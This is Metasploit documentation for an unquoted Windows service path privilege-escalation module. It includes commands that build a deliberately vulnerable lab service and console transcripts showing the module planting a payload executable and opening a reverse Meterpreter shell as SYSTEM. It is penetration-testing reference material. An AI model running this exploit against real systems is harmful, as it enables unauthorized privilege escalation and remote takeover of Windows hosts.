## Vulnerable Application

Commonly known as Trusted Service Path, or Unquoted Service path, this exploits a behavior of windows service.
When a service calls an executable, a full path is given.  If the full path contains a space,
Windows will attempt to execute a file up to the space, with `.exe` appended.
If the executable isn't found, it keeps going until the full path or the next space (and repeat).

@sumitvgithub had an excellent write-up on this
[here](https://medium.com/@SumitVerma101/windows-privilege-escalation-part-1-unquoted-service-path-c7a011a8d8ae)

As is documented in that write-up, if the executable is C:\Program Files\A Subfolder\B Subfolder\C Subfolder\SomeExecutable.exe

Windows will attempt to run the following, in order.

  1.  C:\Program.exe
  2.  C:\Program Files\A.exe
  3.  C:\Program Files\A Subfolder\B.exe
  4.  C:\Program Files\A Subfolder\B Subfolder\C.exe
  5.  C:\Program Files\A Subfolder\B Subfolder\C Subfolder\SomeExecutable.exe

To exploit this, we simply need to go in reverse order to see if we're able to write a payload to those locations.
In Win7+ the deeper folders are more likely to succeed based on default Windows permissions for users.

Then, a service restart is required.  Often a user won't be able to do this,
so the payload is left on disk as a reboot or service restart will trigger the payload to launch.

The service will fail to start as long as the payload remains on disk.  Manual cleanup of the payload
is required.

### Creating a Vulnerable Service

This is sourced from @sumitvgithub's write-up
[here](https://medium.com/@SumitVerma101/windows-privilege-escalation-part-1-unquoted-service-path-c7a011a8d8ae)

With an administrator command prompt, execute the following:

```
sc create "Some Vulnerable Service" binpath= "C:\Program Files\A Subfolder\B Subfolder\C Sub folder\SomeExecutable.exe" Displayname= "Vuln Service DP" start= auto
mkdir "C:\Program Files\A Subfolder\B Subfolder\C Sub folder"
icacls "C:\Program Files\A Subfolder" /grant "BUILTIN\Users":W
```

This creates a vulnerable service, with `A Subfolder` being vulnerable to user writes.

## Verification Steps

  1. Start msfconsole
  2. Get a user shell
  3. Do: ```use exploits/windows/local/unquoted_service_path```
  4. Do: ```set session #```
  5. Do: ```run```
  6. You should get an elevated shell.

## Options

### QUICK

Only exploit the first exploitable service.  `false` will exploit all exploitable service. Default is `true`

## Scenarios

### Windows 10 (16299) with Service Listed Above


```
msf6 exploit(windows/local/unquoted_service_path) > set session 1
session => 1
msf6 exploit(windows/local/unquoted_service_path) > set verbose true
verbose => true
msf6 exploit(windows/local/unquoted_service_path) > set lhost 1.1.1.1
lhost => 1.1.1.1
msf6 exploit(windows/local/unquoted_service_path) > set lport 9090
lport => 9090
msf6 exploit(windows/local/unquoted_service_path) > set quick false
quick => false
msf6 exploit(windows/local/unquoted_service_path) > exploit

[*] Started reverse TCP handler on 1.1.1.1:9090 
[*] Finding a vulnerable service...
[-] Request Error extapi_service_query: Operation failed: Access is denied. Falling back to registry technique
[-] Request Error extapi_service_query: Operation failed: Access is denied. Falling back to registry technique
[-] Request Error extapi_service_query: Operation failed: Access is denied. Falling back to registry technique
[-] Request Error extapi_service_query: Operation failed: Access is denied. Falling back to registry technique
[-] Request Error extapi_service_query: Operation failed: Access is denied. Falling back to registry technique
[-] Request Error extapi_service_query: Operation failed: Access is denied. Falling back to registry technique
[-] Request Error extapi_service_query: Operation failed: Access is denied. Falling back to registry technique
[-] Request Error extapi_service_query: Operation failed: Access is denied. Falling back to registry technique
[-] Request Error extapi_service_query: Operation failed: Access is denied. Falling back to registry technique
[-] Request Error extapi_service_query: Operation failed: Access is denied. Falling back to registry technique
[-] Request Error extapi_service_query: Operation failed: Access is denied. Falling back to registry technique
[-] Request Error extapi_service_query: Operation failed: Access is denied. Falling back to registry technique
[-] Request Error extapi_service_query: Operation failed: Access is denied. Falling back to registry technique
[+] Found potentially vulnerable service: Some Vulnerable Service - c:\Program Files\A Subfolder\B Subfolder\C Sub folder\SomeExecutable.exe (LocalSystem)
[*]   Enumerating vulnerable paths
[-]     c:\Program Files\A Subfolder\B Subfolder\ is not writable
[+]     c:\Program Files\A Subfolder\ is writable
[-]     c:\Program Files\ is not writable
[-]     c:\ is not writable
[-] Request Error extapi_service_query: Operation failed: Access is denied. Falling back to registry technique
[-] Request Error extapi_service_query: Operation failed: Access is denied. Falling back to registry technique
[*] Attempting exploitation of Some Vulnerable Service
[*] Placing c:\Program Files\A Subfolder\B.exe for Some Vulnerable Service
[*] Attempting to write 15872 bytes to c:\Program Files\A Subfolder\B.exe...
[+] Manual cleanup of c:\Program Files\A Subfolder\B.exe is required due to a potential reboot for exploitation.
[+] Successfully wrote payload
[*] Launching service Some Vulnerable Service...
[*] Manual cleanup of the payload file is required. Some Vulnerable Service will fail to start as long as the payload remains on disk.
[-] Unable to restart service. System reboot or an admin restarting the service is required. Payload left on disk!!!
[*] Waiting 303 seconds for shell to arrive
[*] Sending stage (175686 bytes) to 2.2.2.2
[*] Meterpreter session 2 opened (1.1.1.1:9090 -> 2.2.2.2:49891) at 2022-12-23 12:29:11 -0500
[*] Attempting to delete payload: c:\Program Files\A Subfolder\B.exe

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

### Windows 10 (18363), QUICK set to true

```
sf6 exploit(multi/script/web_delivery) > use exploit/windows/local/unquoted_service_path
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/local/unquoted_service_path) > set lhost 2.2.2.2
lhost => 2.2.2.2
msf6 exploit(windows/local/unquoted_service_path) > set lport 7777
lport => 7777
msf6 exploit(windows/local/unquoted_service_path) > set session 1
session => 1
msf6 exploit(windows/local/unquoted_service_path) > set verbose true
verbose => true
msf6 exploit(windows/local/unquoted_service_path) > exploit

[*] Started reverse TCP handler on 2.2.2.2:7777 
[-] !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
[-] QUICK option is enabled. If an exploitable service is not found, try 'set QUICK false'.
[-] !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
[*] Finding a vulnerable service...
[-] Request Error extapi_service_query: Operation failed: Access is denied. Falling back to registry technique
[-] Request Error extapi_service_query: Operation failed: Access is denied. Falling back to registry technique
[-] Request Error extapi_service_query: Operation failed: Access is denied. Falling back to registry technique
[-] Request Error extapi_service_query: Operation failed: Access is denied. Falling back to registry technique
[-] Request Error extapi_service_query: Operation failed: Access is denied. Falling back to registry technique
[-] Request Error extapi_service_query: Operation failed: Access is denied. Falling back to registry technique
[+] Found potentially vulnerable service: NetTcpPortSharing - C:\WINDOWS\Microsoft.NET\Framework64\v3.0\Windows Communication Foundation\SMSvcHost.exe (NT AUTHORITY\LocalService)
[*]   Enumerating vulnerable paths
[-]     C:\WINDOWS\Microsoft.NET\Framework64\v3.0\ is not writable
[-] Ignoring unexploitable service
[-] Request Error extapi_service_query: Operation failed: Access is denied. Falling back to registry technique
[-] Request Error extapi_service_query: Operation failed: Access is denied. Falling back to registry technique
[-] Request Error extapi_service_query: Operation failed: Access is denied. Falling back to registry technique
[-] Request Error extapi_service_query: Operation failed: Access is denied. Falling back to registry technique
[-] Request Error extapi_service_query: Operation failed: Access is denied. Falling back to registry technique
[-] Request Error extapi_service_query: Operation failed: Access is denied. Falling back to registry technique
[-] Request Error extapi_service_query: Operation failed: Access is denied. Falling back to registry technique
[-] Request Error extapi_service_query: Operation failed: Access is denied. Falling back to registry technique
[-] Request Error extapi_service_query: Operation failed: Access is denied. Falling back to registry technique
[+] Found potentially vulnerable service: Video Stream - C:\Program Files\VideoStream\1337 Log\checklog.exe (LocalSystem)
[*]   Enumerating vulnerable paths
[+]     C:\Program Files\VideoStream\ is writable
[*] Attempting exploitation of Video Stream
[*] Placing C:\Program Files\VideoStream\1337.exe for Video Stream
[*] Attempting to write 15872 bytes to C:\Program Files\VideoStream\1337.exe...
[+] Manual cleanup of C:\Program Files\VideoStream\1337.exe is required due to a potential reboot for exploitation.
[+] Successfully wrote payload
[*] Launching service Video Stream...
[*] Manual cleanup of the payload file is required. Video Stream will fail to start as long as the payload remains on disk.
[-] Unable to restart service. System reboot or an admin restarting the service is required. Payload left on disk!!!
[*] Waiting 303 seconds for shell to arrive
```

Manually restart the service

```
[*] Sending stage (175686 bytes) to 1.1.1.1
[*] Meterpreter session 2 opened (2.2.2.2:7777 -> 1.1.1.1:1727) at 2022-12-23 12:04:38 -0500
[*] Attempting to delete payload: C:\Program Files\VideoStream\1337.exe

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```